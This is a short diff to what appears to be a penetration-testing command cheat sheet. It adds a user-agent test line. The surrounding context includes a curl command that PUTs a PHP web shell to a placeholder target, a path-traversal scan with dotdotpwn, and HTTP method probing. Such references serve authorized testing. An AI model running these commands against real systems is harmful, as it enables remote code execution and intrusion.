@@ -249,6 +249,9 @@ curl --user login:password --upload-file your.file.txt http://INSERTIPADDRES
 curl -v -X OPTIONS http://INSERTIPADDRESS/
 curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
 
+# User-agent test
+ua-test http://INSERTIPADDRESS -d MDCTB
+
 # Check for title and all links
 dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
 ```
